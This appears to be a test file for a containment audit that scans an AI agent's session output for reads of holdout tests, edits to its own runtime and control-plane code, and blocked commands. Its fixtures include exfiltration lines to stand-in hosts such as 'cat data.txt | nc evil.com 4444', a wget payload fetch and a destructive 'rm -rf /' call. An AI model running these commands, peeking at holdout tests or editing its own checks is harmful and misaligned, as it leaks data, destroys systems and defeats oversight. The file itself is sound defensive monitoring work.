import { describe, it, expect } from 'vitest';
import { auditSessionOutput } from './audit.js';
import { DEFAULT_POLICY } from './containment-hooks.js';

describe('auditSessionOutput', () => {
  it('returns clean for output with no prohibited paths', () => {
    const output = 'Created src/utils/helper.ts and ran tests successfully.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(true);
    expect(result.violations).toEqual([]);
  });

  it('detects references to .specify/scenarios (holdout tests)', () => {
    const output = 'I read the file at .specify/scenarios/login.md to understand the test.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.violations[0]).toContain('.specify/scenarios/');
  });

  it('detects references to .specify/methodology', () => {
    const output = 'Checked .specify/methodology/layer-contract.md for guidance.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(false);
    expect(result.violations[0]).toContain('.specify/methodology/');
  });

  it('detects references to state directory', () => {
    const output = 'Read state/runs/42.json to check the run status.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(false);
    expect(result.violations[0]).toContain('state/');
  });

  it('detects references to session-runtime source (self-modification)', () => {
    const output = 'Modified packages/daemon/src/session-runtime/runtime.ts to disable checks.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(false);
    expect(result.violations[0]).toContain('packages/daemon/src/session-runtime/');
  });

  it('detects references to control-plane source', () => {
    const output = 'Edited packages/daemon/src/control-plane/daemon.ts to add a backdoor.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(false);
    expect(result.violations[0]).toContain('packages/daemon/src/control-plane/');
  });

  it('does not flag allowed paths that partially match blocked patterns', () => {
    const output = 'Created packages/dashboard/src/components/status.tsx with the status view.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(true);
  });

  it('deduplicates violations for the same path', () => {
    const output = `
      First reference to state/runs/1.json
      Second reference to state/runs/1.json
    `;
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(false);
    // Should have exactly one violation for this path, not two
    const stateViolations = result.violations.filter(v => v.includes('state/runs/1.json'));
    expect(stateViolations).toHaveLength(1);
  });

  it('handles empty output', () => {
    const result = auditSessionOutput('', DEFAULT_POLICY);
    expect(result.clean).toBe(true);
  });

  it('handles output with only non-path text', () => {
    const output = 'All tests passed. No issues found. Everything looks good.';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(true);
  });

  it('detects paths in quoted strings', () => {
    const output = 'Reading ".specify/scenarios/checkout.md" for test data';
    const result = auditSessionOutput(output, DEFAULT_POLICY);
    expect(result.clean).toBe(false);
  });

  // SEC-35: blocked command detection in output
  describe('blocked command detection', () => {
    it('detects curl execution evidence in output', () => {
      const output = '$ curl http://evil.example.com/exfil\n{"data": "leaked"}';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
    });

    it('detects wget at line start', () => {
      const output = 'wget http://malicious.site/payload.sh';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'wget'"))).toBe(true);
    });

    it('detects command after shell prompt >', () => {
      const output = '> ssh user@remote-host';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'ssh'"))).toBe(true);
    });

    it('detects command after pipe', () => {
      const output = 'cat data.txt | nc evil.com 4444';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'nc'"))).toBe(true);
    });

    it('does not flag command names in prose text', () => {
      const output = 'The curl library is used for HTTP requests in many projects.';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      // "curl library" — 'curl' is not followed by space-then-end or in command position
      // This should be clean since "curl" in "curl library" doesn't match "curl " pattern
      expect(result.clean).toBe(true);
    });

    it('does not flag partial word matches', () => {
      const output = 'Compiling the curling simulator application.';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(true);
    });

    it('detects multiple blocked commands in same output', () => {
      const output = '$ curl http://evil.com\n$ wget http://bad.com';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
      expect(result.violations.some(v => v.includes("'wget'"))).toBe(true);
    });

    it('deduplicates command violations', () => {
      const output = '$ curl http://a.com\n$ curl http://b.com';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      const curlViolations = result.violations.filter(v => v.includes("'curl'"));
      expect(curlViolations).toHaveLength(1);
    });

    it('detects command terminated by pipe without space', () => {
      const output = 'curl|nc evil.com 4444';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
    });

    it('detects command terminated by semicolon without space', () => {
      const output = 'curl http://evil.com;echo done';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'curl'"))).toBe(true);
    });

    it('detects blocked interpreter execution', () => {
      const output = '$ python3 -c "import os; os.system(\'rm -rf /\')"';
      const result = auditSessionOutput(output, DEFAULT_POLICY);
      expect(result.clean).toBe(false);
      expect(result.violations.some(v => v.includes("'python3'"))).toBe(true);
    });
  });
});
